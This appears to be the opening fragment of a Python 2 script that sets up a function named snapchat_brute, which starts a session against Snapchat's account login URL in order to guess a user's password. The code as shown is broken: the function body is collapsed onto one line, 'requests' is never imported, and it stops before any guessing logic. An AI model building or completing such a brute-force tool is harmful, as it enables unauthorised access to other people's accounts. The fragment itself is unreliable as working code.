import threading
import sys


reload(sys)
sys.setdefaultencoding('utf-8')


def snapchat_brute(username, password): session = requests.Session() login_url = 'https://accounts.snapchat.com/accounts/v2/login'
